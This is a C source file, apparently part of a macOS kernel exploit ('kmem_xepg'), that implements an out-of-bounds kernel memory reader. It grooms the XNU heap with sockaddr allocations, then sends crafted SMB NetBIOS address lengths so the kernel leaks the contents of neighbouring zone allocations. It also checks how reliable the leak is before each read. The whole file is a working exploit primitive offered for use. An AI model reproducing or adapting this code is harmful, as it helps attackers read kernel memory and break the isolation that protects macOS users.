//
//  neighbor_reader.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libproc.h>

#include <sys/un.h>
#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/util/dispatch.h>
#include <xe/util/binary.h>
#include <xe/util/misc.h>

#include "zkext_neighbor_reader.h"
#include "kmem_neighbor_reader.h"
#include "macos_params.h"

#include "../xnu/saddr_allocator.h"
#include "../smb/client.h"

#define MAX_TRIES 25

#define NUM_SAMPLES_FOR_PROBABILITY 100
#define CUTOFF_PROBABILITY 0.95


struct kmem_zkext_neighbor_reader {
    xnu_saddr_allocator_t pad_start_allocator;
    xnu_saddr_allocator_t reader_allocator;
    xnu_saddr_allocator_t pad_end_allocator;
    
    enum {
        STATE_CREATED,
        STATE_USED,
    } state;
    
    struct sockaddr_in smb_addr;
};

void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t reader) {
    xe_assert(reader->pad_start_allocator == NULL);
    xe_assert(reader->reader_allocator == NULL);
    xe_assert(reader->pad_end_allocator == NULL);
    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 4);
    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 28);
    reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 4);
}

kmem_zkext_neighour_reader_t kmem_zkext_neighbor_reader_create(const struct sockaddr_in* smb_addr) {
    kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
    bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
    
    reader->smb_addr = *smb_addr;
    kmem_neighbor_reader_init_saddr_allocators(reader);
    
    reader->state = STATE_CREATED;
    return reader;
}

double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, uint8_t addr_len) {
    int num_overwritten = ((int)addr_len - 1) / 64;
    int total_size = (num_overwritten + 1) * 64;
    uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
    xe_assert_cond(total_size, <=, UINT8_MAX);
    
    uint32_t* local_nb_name_size = alloca(sizeof(uint32_t));
    *local_nb_name_size = 2048;
    char* local_nb_name = malloc(*local_nb_name_size);
    int num_hits = 0;
    
    for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        
        dispatch_async(xe_dispatch_queue(), ^() {
            struct kmem_neighbor_reader_args params;
            params.smb_addr = reader->smb_addr;
            params.saddr_snb_len = sizeof(struct sockaddr_nb);
            params.saddr_ioc_len = sizeof(struct sockaddr_nb);
            params.saddr_snb_name_seglen = 3;
            static_assert(sizeof(struct sockaddr_nb) > 48 && sizeof(struct sockaddr_nb) <= 64, "");
            params.laddr_snb_len = 64;
            params.laddr_ioc_len = zone_size;
            params.laddr_snb_name_seglen = to_read;
            
            kmem_neighbor_reader_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
            dispatch_semaphore_signal(sem);
        });
        
        if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 3 * 1000000000ULL))) {
            xe_log_warn("kmem neighbor read timed out");
            continue;
        }
        
        xe_assert_cond(*local_nb_name_size, >=, to_read + 1);
        
        uint8_t first_segment_size = local_nb_name[0];
        xe_assert_cond(first_segment_size, ==, to_read);
        
        int bytes_to_skip = 64 - offsetof(struct sockaddr_nb, snb_name);
        
        _Bool is_hit = TRUE;
        for (int i=0; i<num_overwritten; i++) {
            struct sockaddr_un un;
            memcpy(&un, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_un));
            if (un.sun_len != 64 || un.sun_family != AF_LOCAL) {
                is_hit = FALSE;
                break;
            }
        }
        
        if (is_hit) {
            num_hits++;
        }
    }
    
    free(local_nb_name);
    return (double)num_hits / (double)NUM_SAMPLES_FOR_PROBABILITY;
}

int kmem_zkext_neighbor_reader_read_internal(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, char* data, size_t data_size) {
    xe_assert_cond(data_size, <=, zone_size);
    xe_assert_cond(reader->state, ==, STATE_CREATED);
//    xe_assert_cond(zone_size, >=, 64);
    xe_assert_cond(zone_size, <, 128);
    
    reader->state = STATE_USED;
    xnu_saddr_allocator_allocate(reader->pad_start_allocator);
    xnu_saddr_allocator_allocate(reader->reader_allocator);
    xnu_saddr_allocator_fragment(reader->reader_allocator, 8);
    xnu_saddr_allocator_allocate(reader->pad_end_allocator);
    
    for (int i=0; i<MAX_TRIES; i++) {
        double probability = kmem_zkext_neighbor_reader_check(reader, zone_size, zone_size * 2);
        if (probability < CUTOFF_PROBABILITY) {
            xe_log_debug("skipping read due to low success probability of %.2f", probability);
            continue;
        }
        
        uint32_t local_nb_name_size = 2048;
        char* local_nb_name = malloc(local_nb_name_size);
                
        uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
        
        struct kmem_neighbor_reader_args params;
        params.smb_addr = reader->smb_addr;
        params.saddr_snb_len = sizeof(struct sockaddr_nb);
        params.saddr_ioc_len = sizeof(struct sockaddr_nb);
        params.saddr_snb_name_seglen = 3;
        params.laddr_snb_len = zone_size * 2;
        params.laddr_ioc_len = zone_size;
        params.laddr_snb_name_seglen = snb_name_seglen;
        
        kmem_neighbor_reader_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
        
        xe_assert_cond(local_nb_name_size, >=, snb_name_seglen);
        
        uint8_t first_segment_len = local_nb_name[0];
        xe_assert_cond(first_segment_len, ==, snb_name_seglen);
        
        int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
        xe_log_debug_hexdump(&local_nb_name[bytes_to_skip], data_size, "neighbor data: ");
        memcpy(data, &local_nb_name[bytes_to_skip], data_size);
        
        free(local_nb_name);
        goto done;
    }
    
    return EAGAIN;
    
done:
    return 0;
}

int kmem_zkext_neighbor_reader_read(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, char* data, size_t data_size) {
    dispatch_queue_t queue = dispatch_queue_create("reader", dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INTERACTIVE, DISPATCH_QUEUE_PRIORITY_HIGH));
    
    volatile _Bool* stop = alloca(sizeof(_Bool));
    *stop = FALSE;
    int* res = alloca(sizeof(int));
    dispatch_apply(xe_cpu_count(), queue, ^(size_t index) {
        if (index == 0) {
            xe_sleep_ms(10);
            *res = kmem_zkext_neighbor_reader_read_internal(reader, zone_size, data, data_size);
            *stop = TRUE;
        } else {
            while (!*stop) {}
        }
    });
    
    dispatch_release(queue);
    return *res;
}

void kmem_zkext_neighbor_reader_reset(kmem_zkext_neighour_reader_t reader) {
    xe_assert(reader->state == STATE_USED);
    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
    kmem_neighbor_reader_init_saddr_allocators(reader);
    reader->state = STATE_CREATED;
}

void kmem_zkext_neighbor_reader_destroy(kmem_zkext_neighour_reader_t* reader_p) {
    kmem_zkext_neighour_reader_t reader = *reader_p;
    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
    free(reader);
    *reader_p = NULL;
}
